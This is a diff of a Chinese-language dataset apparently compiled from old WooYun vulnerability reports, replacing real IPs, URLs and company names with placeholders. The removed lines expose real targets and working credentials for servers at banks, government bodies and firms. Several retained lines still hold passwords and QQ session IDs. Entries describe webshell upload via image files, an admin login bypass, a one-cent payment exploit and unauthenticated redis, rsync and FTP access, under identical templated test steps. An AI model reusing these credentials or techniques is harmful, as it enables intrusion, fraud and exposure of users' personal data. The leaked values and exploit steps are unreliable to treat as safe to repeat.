 
@@ -21810,7 +21810,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: ssh admin@58.248.41.222P@ssw0rd
+**详情**: ssh admin@[IP已脱敏]P@ssw0rd
 
 **POC**: [admin@smtp1 ~]$ netstat -antp(Not all processes could be identified, non-owned process infowill not be shown, you would have to be root to see it all.)Active Internet connections (servers and established)Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Pro
 
@@ -21865,7 +21865,7 @@
 
 ---
 ### [wooyun-2014-054893] 嗨淘网某站漏洞可泄漏百万用户信息严重影响业务系统
-**厂商**: 阿里巴巴 | **年份**: 2014 | **类型**: 应用配置错误
+**厂商**: 某电商平台 | **年份**: 2014 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -21876,7 +21876,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: PS：wooyun漏洞审核的童鞋，请联系好处理的厂商之后，再进行审核确认，这漏洞太明显了，免得被其它童鞋看到标题之后各种渗透！Google site:hitao.com 发现蛋碎的百年难得一见的漏洞！查看源代码居然能看到N多管理的帐号密码电话等，如图：100多位管理帐号+员工+供应商之类的帐号邮箱电话信息，批量解密CMD5，获得26位，其中有超级管理员可成功登录仓库管理系统(http://shopware.hitao.com) 如图：可修改操作订单，库存等等，严重影响业务系统运转。继续渗透，成功用其它帐号登录ERP管理系统(http://erp.hitao.com/),同样是超级管理员，ERP管理系统功能太全面了，如图，可导出120多万用户的详细信息（淘宝ID，电话，姓名，地址）：能够导出100多W用户的信息，未测试；能够修改订单等等，能够让整个运营支持系统出现问题！泄漏各种财务信息。
+**详情**: PS：wooyun漏洞审核的童鞋，请联系好处理的厂商之后，再进行审核确认，这漏洞太明显了，免得被其它童鞋看到标题之后各种渗透！Google site:hitao.com 发现蛋碎的百年难得一见的漏洞！查看源代码居然能看到N多管理的帐号密码电话等，如图：100多位管理帐号+员工+供应商之类的帐号邮箱电话信息，批量解密CMD5，获得26位，其中有超级管理员可成功登录仓库管理系统(https://example.com/[已脱敏]) 如图：可修改操作订单，库存等等，严重影响业务系统运转。继续渗透，成功用其它帐号登录ERP管理系统(https://example.com/[已脱敏]),同样是超级管理员，ERP管理系统功能太全面了，如图，可导出120多万用户的详细信息（某电商平台ID，电话，姓名，地址）：能够导出100多W用户的信息，未测试；能够修改订单等等，能够让整个运营支持系统出现问题！泄漏各种财务信息。
 
 **POC**: 再来几张图，未继续深入了，如图：
 
@@ -21900,7 +21900,7 @@
 
 **详情**: 吉林省电信短信发送web service无权限验证，可发任意电信用户任意短信内容，仅测试了吉林省电信用户。
 
-**POC**: 服务地址http://175.30.250.117/sms/services/Dabase?wsdl无需任何权限验证即可发送信息提供如下功能：测试方法：利用AWVS的web service editor输入服务地址，点击import选择sendSMS填写信息点击send即可手机端收到的信息如下：
+**POC**: 服务地址http://[IP已脱敏] service editor输入服务地址，点击import选择sendSMS填写信息点击send即可手机端收到的信息如下：
 
 **绕过**: 直接利用
 
@@ -21920,7 +21920,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 和前几年报过的其他输入法的问题类似。万能五笔输入法，由于配置不当，可绕过Windows登录界面从而执行任意程序。在官方论坛上看，还是很活跃的，使用的人不少，平时遇到的不是太多。程序下载地址：http://www.wnwb.com/受影响版本：最新版本，9.6.1.2测试环境：win7（64位）、Windows2008（64位），在2个测试环境中均为system权限。测试的版本有：9.6.1.2、9.5.1.2利用方法：在Windows登录界面，切换到万能五笔输入，按任意键，点击【属性设置】-->【词库管理】-->点击"导入"按钮，就会打开Windows资源管理器。#01 win7#02 Windows2008
+**详情**: 和前几年报过的其他输入法的问题类似。万能五笔输入法，由于配置不当，可绕过Windows登录界面从而执行任意程序。在官方论坛上看，还是很活跃的，使用的人不少，平时遇到的不是太多。程序下载地址：https://example.com/[已脱敏]"导入"按钮，就会打开Windows资源管理器。#01 win7#02 Windows2008
 
 **POC**: (见原文)
 
@@ -21944,7 +21944,7 @@
 
 **详情**: Office Anywhere 2011 网络智能办公系统存在一个通用路径泄漏问题，而泄漏的登录地址可以不需要权限登录到phpmyadmin且权限为root/mysql/main.php解密出来可直接登录,这里就不登录进去了
 
-**POC**: 附部分案例：http://218.24.163.216:8080/http://220.171.81.126:1234/http://221.2.43.9:8000/http://221.204.213.24/http://60.28.24.173:8080/http://58.119.178.7/http://218.94.118.110:8086/http://101.36.75.71/
+**POC**: 附部分案例：http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -22008,9 +22008,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.首先，打开活动页面（http://tv.sohu.com/s2014/msyh/index.shtml），登陆搜狐账号，再次打开活动页面，点击“立即订购”2.页面跳转至支付宝支付页面，输入账号信息，下一步3.关键的来了，支付的时候取消勾选“开通支付宝一键支付”4.好了，不要急着下一步，找到“我的订单”，先进去什么都没有，然后刷新一下，出来这么一条，删掉它5.重复1,2,3,4步骤，你会发现，每个订单都只要1分钱，然后确认每个订单即可
+**详情**: 1.首先，打开活动页面（https://example.com/[已脱敏]
 
-**POC**: 我测试了两个订单，会员达到60天：这种测试不要贪心了~毕竟连支付宝的。不过有人已经测试过1年的。
+**POC**: 我测试了两个订单，会员达到60天：这种测试不要贪心了~毕竟连某电商平台的。不过有人已经测试过1年的。
 
 **绕过**: 直接利用
 
@@ -22030,7 +22030,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: ping v.weipai.cnPING cc00009.f.cncssr.chinacache.net (112.90.226.133): 56 data bytes64 bytes from 112.90.226.133: icmp_seq=0 ttl=51 time=89.610 ms64 bytes from 112.90.226.133: icmp_seq=1 ttl=51 time=92.313 ms^C--- cc00009.f.cncssr.chinacache.net ping statistics ---
+**详情**: ping v.weipai.cnPING cc00009.f.cncssr.chinacache.net ([IP已脱敏]): 56 data bytes64 bytes from [IP已脱敏]: icmp_seq=0 ttl=51 time=89.610 ms64 bytes from [IP已脱敏]: icmp_seq=1 ttl=51 time=92.313 ms^C--- cc00009.f.cncssr.chinacache.net ping statistics ---
 
 **POC**: 不用证明了
 
@@ -22074,7 +22074,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 关键字：技术支持: 达讯网络就以这个为例子：  http://www.hising.com.cn地址后面加上 数据库默认地址：/data/shop.mdb然后就出现了这个：打开它  就是这个样子的：这些就是传说中的管理员了吧然后通过查看别的网站也是存在一样的结果这些个都是截图还有这些网站都有问题，  就不截图了http://www.fty163.com/data/shop.mdbwww.bxgpower.com/data/shop.mdbwww.gzgema.com/data/shop.mdbhttp://www.jwyb168.com.cn/data/shop.mdb等等，百度前几页就30多个
+**详情**: 关键字：技术支持: 达讯网络就以这个为例子：  https://example.com/[已脱敏] 数据库默认地址：/data/shop.mdb然后就出现了这个：打开它  就是这个样子的：这些就是传说中的管理员了吧然后通过查看别的网站也是存在一样的结果这些个都是截图还有这些网站都有问题，  就不截图了https://example.com/[已脱敏]
 
 **POC**: 证明要怎么写呢还是截图吧：
 
@@ -22096,7 +22096,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://minigame.sdo.com/taojin/dbconnect-taojin.php
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -22118,7 +22118,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 多台memcache与redis外网开放。118.26.203.8/13/15 11211118.26.203.3/4/20/17/23 6379其中包含用户充值站点http://pay.anzhi.com/web/rechargeping pay.anzhi.com正在 Ping pay.anzhi.com [118.26.203.13] 具有 32 字节的来自 118.26.203.13 的回复: 字节=32 时间=42ms TTL=128来自 118.26.203.13 的回复: 字节=32 时间=42ms TTL=128memcache保存用户密码信息
+**详情**: 多台memcache与redis外网开放。[IP已脱敏] 11211118.26.203.3/4/20/17/23 6379其中包含用户充值站点https://example.com/[已脱敏] pay.anzhi.com正在 Ping pay.anzhi.com [[IP已脱敏]] 具有 32 字节的来自 [IP已脱敏] 的回复: 字节=32 时间=42ms TTL=128来自 [IP已脱敏] 的回复: 字节=32 时间=42ms TTL=128memcache保存用户密码信息
 
 **POC**: (见原文)
 
@@ -22140,7 +22140,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 北京蓝汛通信技术有限责任公司某服务器数据库配置不当泄漏千万电话号码ip: 58.68.232.235
+**详情**: 北京蓝汛通信技术有限责任公司某服务器数据库配置不当泄漏千万电话号码ip: [IP已脱敏]
 
 **POC**: redis数据库配置不当，未设密码，直接可远程连接，数据都在db3里，统计计算了下，有一千多万的电话号码吧，涉及各省各地
 
@@ -22184,9 +22184,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://zhongyi.ifeng.com/agent-admin/login.aspxhttp://signup.ifeng.com/freeform/admin/http://admin.ifeng.com/indexcmt.ifeng.com/admin/login.jsp
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://zhongyi.ifeng.com/agent-admin/login.aspxhttp://signup.ifeng.com/freeform/admin/http://admin.ifeng.com/indexcmt.ifeng.com/admin/login.jsp
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -22206,7 +22206,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 119.254.48.109/Config.inc
+**详情**: [IP已脱敏]
 
 **POC**: 快递密钥备份文件查看后已删除
 
@@ -22228,7 +22228,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.lygdfrcb.com/ckfinder/ckfinder.html?action=js&func=SetFileField&data=xPicture&thumbFunc=ShowThumbnails&start=Images.asp%3A%2F%3A0直接访问http://www.lygdfrcb.com/ckfinder/ckfinder.html
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 利用解析x.asp/1.jpg1.jpg伪造下copy 1.jpg /b+1.txt asp.gif也可以直接上传，再修改名字1.asp;.gif直接得到shell直接访问造成一句话
 
@@ -22250,9 +22250,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://61.155.234.222:8081/psa/Homepage.action直接访问http://61.155.234.222:8081/psa/login.action?falg=psa&userid=e00100230&userpwd=31e1xwc1nlw=直接跳转到员工main入口
+**详情**: http://[IP已脱敏]
 
-**POC**: 这时候，我们只需要改下参数，即可以普通权限，提升系统管理员权限看我操作http://61.155.234.222:8081/psa/login.actionadmin admin普通是无法登录的那么必须在普通参数上，改，密码就算错误，也算默认进去了。这是典型的前端开发设计错误===================================http://61.155.234.222:8081/psa/login.action?falg=psa&userid=admin&userpwd=admin=直接把userid=替换为管理员，密码也一样这样就直接进去了系统总管理~真可怕~~普通权限：h
+**POC**: 这时候，我们只需要改下参数，即可以普通权限，提升系统管理员权限看我操作http://[IP已脱敏] admin普通是无法登录的那么必须在普通参数上，改，密码就算错误，也算默认进去了。这是典型的前端开发设计错误===================================http://[IP已脱敏]
 
 **绕过**: 直接利用
 
@@ -22272,7 +22272,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: rsync 211.156.128.40::Mail/drwxr-xr-x        4096 2013/09/22 00:03:12 .-rw-r--r--           0 2009/02/10 22:20:30 .installed-rw-r--r--           0 2013/09/22 00:03:12 adrwxr-xr-x        4096 2009/02/10 22:19:46 BackMaildrwxr-xr-x        4096 2009/02/10 22:19:46 Domaindrwxr-xr-x        4096 2009/02/10 22:19:46 Maildrwxr-xr-x        4096 2010/02/05 02:36:23 MailTmpdrwxr-xr-x        4096 2009/02/10 2
+**详情**: rsync [IP已脱敏]::Mail/drwxr-xr-x        4096 2013/09/22 00:03:12 .-rw-r--r--           0 2009/02/10 22:20:30 .installed-rw-r--r--           0 2013/09/22 00:03:12 adrwxr-xr-x        4096 2009/02/10 22:19:46 BackMaildrwxr-xr-x        4096 2009/02/10 22:19:46 Domaindrwxr-xr-x        4096 2009/02/10 22:19:46 Maildrwxr-xr-x        4096 2010/02/05 02:36:23 MailTmpdrwxr-xr-x        4096 2009/02/10 2
 
 **POC**: (见原文)
 
@@ -22316,9 +22316,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 商务通某平台源码泄漏http://web.zoosnet.net/zoosnet.rar
+**详情**: 商务通某平台源码泄漏https://example.com/[已脱敏]
 
-**POC**: http://web.zoosnet.net/zoosnet.rar
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -22338,7 +22338,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 注册个账号，上传把php一句话放在图片的最后，当头像上传菜刀连接，换成aspx的一句话前人痕迹加用户，连接redesktop 113.12.84.254 -u 'test' -p 'testqwe!@#' -f好多子站，竟然没有激活本地mysql数据库http://votegd.gridinn.com/phpmyadmin root qq112233mssql sa nzh19870901子站1 http://cytsadm.hszw.com/ 112233会员信息账号密码登录下
+**详情**: 注册个账号，上传把php一句话放在图片的最后，当头像上传菜刀连接，换成aspx的一句话前人痕迹加用户，连接redesktop [IP已脱敏] -u 'test' -p 'testqwe!@#' -f好多子站，竟然没有激活本地mysql数据库https://example.com/[已脱敏] root 某互联网公司112233mssql sa nzh19870901子站1 https://example.com/[已脱敏] 112233会员信息账号密码登录下
 
 **POC**: 如上
 
@@ -22360,7 +22360,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 开封市商业银行整站下载（可查看数据库）   可能是管理员疏忽把整站文件放到了根目录！http://www.bankkf.com/
+**详情**: 开封市商业银行整站下载（可查看数据库）   可能是管理员疏忽把整站文件放到了根目录！https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -22384,7 +22384,7 @@
 
 **详情**: 国家测绘工程技术研究中心是国家科技发展计划的重要组成部分，是测绘科技发展的重要基础平台，是国家测绘系统第一个国家级的工程技术研究中心。国家级  不做更深层次的渗透了
 
-**POC**: 注入点http://nercsm.casm.ac.cn/Viewnews.aspx?ID=131
+**POC**: 注入点https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -22404,7 +22404,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 怪不得老出事，主站都不搞好http://www.umpay.com/WEB-INF/web.xml
+**详情**: 怪不得老出事，主站都不搞好https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -22426,7 +22426,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: rsync -av 123.125.117.106::
+**详情**: rsync -av [IP已脱敏]::
 
 **POC**: (见原文)
 
@@ -22448,7 +22448,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 陕西省华县房地产开发管理局http://61.150.78.80//test.txt
+**详情**: 陕西省华县房地产开发管理局http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -22514,7 +22514,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 源码下载地址：http://www.cdswbb.gov.cn/wwwroot.zip数据库可直连，控制Mysql数据库，泄露管理员MD5密码老话，政府网站，不进一步了，呵呵，，，我是好人，不要查我水表
+**详情**: 源码下载地址：https://example.com/[已脱敏]
 
 **POC**: MD5值可反算，这里就不上图了
 
@@ -22546,8 +22546,8 @@
 ---
 
 ---
-### [wooyun-2013-017288] 微信秘籍 - 利用基站原理摇出更多的人
-**厂商**: 微信 | **年份**: 2013 | **类型**: 默认配置不当
+### [wooyun-2013-017288] 某互联网公司秘籍 - 利用基站原理摇出更多的人
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 默认配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -22558,7 +22558,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.  root你的设备；/*请google查询如何root*/2.  使用第三方应用拒绝wechat自动定位，或重新修改apk。3.  你已经成功了一半，请打开微信尝试。/*若使用寻找附近的人功能，请允许wechat获取位置*/
+**详情**: 1.  root你的设备；/*请google查询如何root*/2.  使用第三方应用拒绝wechat自动定位，或重新修改apk。3.  你已经成功了一半，请打开某互联网公司尝试。/*若使用寻找附近的人功能，请允许wechat获取位置*/
 
 **POC**: OK，先来几张成功的图分享给诸位。这些是我使用日本linode摇出来的，都是外国人的哦""你可以使用任何vpn去摇，不过也有不成功的情况。这可能和你的apn接入点、网络环境情况、时间段有关系""原理很简单，就是不允许wechat定位你的位置，从而找距离你ip最近的用户。他是按你的ip来找的，所以一次就很多人喽""移动网络更好理解，就是摇出来的都是同一基站的用户。图片能给你结论■
 
@@ -22580,9 +22580,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 数据库读写权限不合理且无任何安全访问和访问控制；document.location.href="http://www.hbspoa.com:80/file/zwzwdel-File.shtml?para.qualifications_id="+annex_code.value+"&amp;para.company_code="+company_code.value;文件访问权限设置不合理；
+**详情**: 数据库读写权限不合理且无任何安全访问和访问控制；document.location.href="https://example.com/[已脱敏]"+annex_code.value+"&amp;para.company_code="+company_code.value;文件访问权限设置不合理；
 
-**POC**: 页面：http://www.hbspoa.com/file/zwselFile.shtml;jsessionid=497BA7B4D30C67C48362028A555A849E?para.company_code=&para.res=6原始文档扫描件可随便下载：这里贴一个
+**POC**: 页面：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -22604,7 +22604,7 @@
 
 **详情**: 北京师范大学某分站存在文件遍历
 
-**POC**: 遍历链接http://course.bnu.edu.cn/course/cgeography/cn/html/其中一处论坛打包下载压缩文件里有数据库文件 包含论坛用户帐密邮箱信息------The End------
+**POC**: 遍历链接https://example.com/[已脱敏] 包含论坛用户帐密邮箱信息------The End------
 
 **绕过**: 直接利用
 
@@ -22668,13 +22668,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://upload.umiwi.com/2011/0905/1315207969664.jpg/1.php  爆网站绝对路径http://bbs.umiwi.com/static/image/common/logo.png/1.php  优米论坛nginx解析漏洞
+**详情**: https://example.com/[已脱敏]  爆网站绝对路径https://example.com/[已脱敏]  优米论坛nginx解析漏洞
 
-**POC**: http://bbs.umiwi.com/static/image/common/logo.png/1.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 引用自百度：1 关闭php.ini里的path_info，cgi.path_info设置成0.如果默认前面有;或者就没这段，就手动加上cgi.path_info = 0，2 修改nginx里的设置。比如原始文件server {listen       80;server_name typengine
+**修复**: 引用自某搜索引擎：1 关闭php.ini里的path_info，cgi.path_info设置成0.如果默认前面有;或者就没这段，就手动加上cgi.path_info = 0，2 修改nginx里的设置。比如原始文件server {listen       80;server_name typengine
 ---
 
 ---
@@ -22690,13 +22690,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 115.28.11.62 MongoDB 配置不当
+**详情**: [IP已脱敏] MongoDB 配置不当
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 参考 http://drops.wooyun.org/tips/2470
+**修复**: 参考 https://example.com/[已脱敏]
 ---
 
 ---
@@ -22734,9 +22734,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: aplayer.open.xunlei.com/查询服务器ip得到：123.162.191.120ftp://123.162.191.120/没有设置密码，可以直接访问，整站源码可以down下来可以看到最后更新的时间是12月3号，也就是几天前。
+**详情**: aplayer.open.xunlei.com/查询服务器ip得到：[IP已脱敏]ftp://[IP已脱敏]
 
-**POC**: 通过访问ftp://123.162.191.120/web/aplayer.open.xunlei.com/bbs/data/sql_config.php拿到$dbuser = 'aplayer';$dbpw = 'aplayer-9898w';$dbname = 'aplayer';$database = 'mysql';但是没有扫到mysql端口。// 创始人用户名数组$manager = array('aplayer');// 创始人密码数组$manager_pwd = array('fab216ce8cfb24b3bf8983d5e612e776');解密没有出来，但抱着试试多运气，用
+**POC**: 通过访问ftp://[IP已脱敏] = 'aplayer';$dbpw = 'aplayer-9898w';$dbname = 'aplayer';$database = 'mysql';但是没有扫到mysql端口。// 创始人用户名数组$manager = array('aplayer');// 创始人密码数组$manager_pwd = array('fab216ce8cfb24b3bf8983d5e612e776');解密没有出来，但抱着试试多运气，用
 
 **绕过**: 直接利用
 
@@ -22822,9 +22822,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://img.soufun.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://img.soufun.comhttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -22844,9 +22844,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.jinmajia.com/WEB-INF/web.xml
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://www.jinmajia.com/WEB-INF/web.xml
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -22855,7 +22855,7 @@
 
 ---
 ### [wooyun-2012-05245] Runtime Error
-**厂商**: 京东商城 | **年份**: 2012 | **类型**: 应用配置错误
+**厂商**: 某电商平台商城 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -22866,9 +22866,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 点击购买按钮出错出错的网址：http://jd2008.360buy.com/purchase/InitCart.aspx?pid=10067402&pcount=1&ptype=1
+**详情**: 点击购买按钮出错出错的网址：https://example.com/[已脱敏]
 
-**POC**: 点击购买按钮出错出错的网址：http://jd2008.360buy.com/purchase/InitCart.aspx?pid=10067402&pcount=1&ptype=1
+**POC**: 点击购买按钮出错出错的网址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -22876,8 +22876,8 @@
 ---
 
 ---
-### [wooyun-2013-024137] 淘宝solr暴露在外网
-**厂商**: 淘宝网 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
+### [wooyun-2013-024137] 某电商平台solr暴露在外网
+**厂商**: 某电商平台网 | **年份**: 2013 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -22888,7 +22888,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: URL：http://110.75.32.56
+**详情**: URL：http://[IP已脱敏]
 
 **POC**: 截两张图得了：
 
@@ -22910,7 +22910,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 泄露地址：http://www.hkbea.com.cn/.bash_history
+**详情**: 泄露地址：https://example.com/[已脱敏]
 
 **POC**: pwdmore .profiledisserver.shpwdlscd WWWROOTEN/lscd dyxx/lscd gydy/lscp index.shtml index.shtml.bakls -lasu - ebankwebmore disserver.shvi enserver.shlsls -lamv index.shtml ../../WWWROOTEN/fxwl/zgwl/lsmv index.shtml ../../WWWROOTEN/fxwl/zgwl/hostnamecat disserver.shcat enserver.shpwdlscd fxwl/lsrm -rf
 
@@ -22932,7 +22932,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 主站地址http://www.gzgwbn.com.cn/http://www.gzgwbn.com.cn/wwwroot.rar 整站源码列目录ASP后缀的数据库，将后缀改为MDB及可
+**详情**: 主站地址https://example.com/[已脱敏] 整站源码列目录ASP后缀的数据库，将后缀改为MDB及可
 
 **POC**: (见原文)
 
@@ -22986,7 +22986,7 @@
 ---
 
 ---
-### [wooyun-2012-010020] PHP在线挂QQ个人隐私泄漏
+### [wooyun-2012-010020] PHP在线挂某互联网公司个人隐私泄漏
 **厂商**: 小应用 | **年份**: 2012 | **类型**: 默认配置不当
 
 **元思考**: 触发信号: 认证接口
@@ -22998,9 +22998,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: PHP在线挂QQ个人隐私泄漏，可导致通过手机腾讯网SID登录QQ，进而进行诈骗、社工等。目前很流行的一个系统，因为对数据文件权限设置不当，可以随意下载，获得用户QQ的SID，众所周知，有了QQ号码和SID，就能在手机腾讯网上登录QQ。目前有两种使用比较广泛的：其搜索引擎关键词分别是：1."本站现在24小时全天挂机 inurl:look.php"2."24小时挂Q系统 挂Q状态查询 提取SID码"数据文件分别是：1.xx.com/gq_date.dat2.xx.com/db.dat当然有一些站也做了修改，权限设置等这个漏洞就无效。
+**详情**: PHP在线挂某互联网公司个人隐私泄漏，可导致通过手机某互联网公司网SID登录某互联网公司，进而进行诈骗、社工等。目前很流行的一个系统，因为对数据文件权限设置不当，可以随意下载，获得用户某互联网公司的SID，众所周知，有了某互联网公司号码和SID，就能在手机某互联网公司网上登录某互联网公司。目前有两种使用比较广泛的：其搜索引擎关键词分别是：1."本站现在24小时全天挂机 inurl:look.php"2."24小时挂Q系统 挂Q状态查询 提取SID码"数据文件分别是：1.xx.com/gq_date.dat2.xx.com/db.dat当然有一些站也做了修改，权限设置等这个漏洞就无效。
 
-**POC**: http://tcsq.by.76at.com/gq_date.dattcsq,2215335746,AYHGwqNTPBHeLcaZyImus4ui,2012-02-17 13:35:29 ;tcsq,592600540,AeHSLAtdKAJs09U3qr3ayNai,2012-02-17 13:35:54 ;tcsq,822481102,AX2x0xCTKjAmulH3WNynLOyi,2012-02-17 13:36:28 ;tcsq,1113435604,AU_pjPX2eD4ERB3sHATBh0ai,2012-02-17 13:36:51 ;tcsq,1275285347,Adf
+**POC**: https://example.com/[已脱敏] 13:35:29 ;tcsq,592600540,AeHSLAtdKAJs09U3qr3ayNai,2012-02-17 13:35:54 ;tcsq,822481102,AX2x0xCTKjAmulH3WNynLOyi,2012-02-17 13:36:28 ;tcsq,1113435604,AU_pjPX2eD4ERB3sHATBh0ai,2012-02-17 13:36:51 ;tcsq,1275285347,Adf
 
 **绕过**: 直接利用
 
@@ -23042,7 +23042,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 直接访问1：https://www.idwzx.com/api/v2/loans/getCrowdFundLoanWithPage?pageSize=10&status=SCHEDULED&loanType=CROWDFUND&currentPage=2&orderBy=timeOpencurrentPage=1https://www.idwzx.com/api/v2/loans/getCrowdFundLoanWithPage?pageSize=10&status=SCHEDULED&loanType=CROWDFUND&currentPage=1&orderBy=timeOpen2：https://www.idwzx.com/api/v2/loans/getLoanWithPage?pageSize=10&status=SCHEDULED&minDuration=0&maxDurati
+**详情**: 直接访问1：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -23064,7 +23064,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 计算机课真无聊......（还是第一次在乌云提交漏洞呢~）1、lnmp一键环境包0.9中有个pureftpd的安装选项，安装时同时会安装一个PHP的控制面板。但是很少有人注意这个面板的有个install.php脚本。访问路径为 http://www.jingmen.gov.cn/ftp/install.php2、这个安装脚本会在第五步让用户修改ftp面板的Admin用户的密码或添加ftp面板的管理员。3、添加成功后即可访问ftp的面板，接着我们就可以添加ftp的用户，然后.....
+**详情**: 计算机课真无聊......（还是第一次在乌云提交漏洞呢~）1、lnmp一键环境包0.9中有个pureftpd的安装选项，安装时同时会安装一个PHP的控制面板。但是很少有人注意这个面板的有个install.php脚本。访问路径为 https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -23086,7 +23086,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://a.ikangdental.com/log/2015-04-20.txt
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -23108,9 +23108,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: ip：58.68.250.205次服务器redis数据库未设密码，直接远程访问ip：58.68.130.146
+**详情**: ip：[IP已脱敏]次服务器redis数据库未设密码，直接远程访问ip：[IP已脱敏]
 
-**POC**: 58.68.130.146 存在HTTP.sys远程代码执行漏洞,且redis数据库未授权访问
+**POC**: [IP已脱敏] 存在HTTP.sys远程代码执行漏洞,且redis数据库未授权访问
 
 **绕过**: 直接利用
 
@@ -23154,7 +23154,7 @@
 
 **详情**: 
 
-**POC**: 0x01:bbs.chexun.com 备份后没有删除http://bbs.chexun.com/source/plugin.tar.gz0x02:SVN源代码泄漏http://comment.chexun.com/.svn/entriesSVN服务器是在内网http://10.0.0.40:8080/svntest/，没做下一步测试。列出文件目录可以jsp文件源代码
+**POC**: 0x01:bbs.chexun.com 备份后没有删除https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -23174,7 +23174,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 任意手机注册  第一步  正常注册个账号重设密码就用我刚刚那个手机号 13555555555  短信我当然收不到了http://login.jifentao.com/password/repassword3.jsp改成http://login.jifentao.com/password/repassword4.jsp 直接跳过验证
+**详情**: 任意手机注册  第一步  正常注册个账号重设密码就用我刚刚那个手机号 13555555555  短信我当然收不到了https://example.com/[已脱敏] 直接跳过验证
 
 **POC**: (见原文)
 
@@ -23196,7 +23196,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.chinamacro.cn/console/  weblogic  12345678http://scm.chinamacro.cn:8001/ weblogic反序列化http://scm.chinamacro.cn/console/  weblogic  12345678http://218.13.34.122:8082/  weblogic反序列化http://www.chinamacro.cn/h/f.jsphttp://218.13.34.122:8082/f.jsphttp://scm.chinamacro.cn/f.jsp
+**详情**: https://example.com/[已脱敏]  weblogic  12345678https://example.com/[已脱敏] weblogic反序列化https://example.com/[已脱敏]  weblogic  12345678http://[IP已脱敏]  weblogic反序列化https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -23218,13 +23218,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 42.121.33.67 MongoDB 配置不当
+**详情**: [IP已脱敏] MongoDB 配置不当
 
 **POC**: (见原文)
 
 **绕过**: 直接利用
 
-**修复**: 参照 MongoDB安全配置 http://drops.wooyun.org/tips/2470
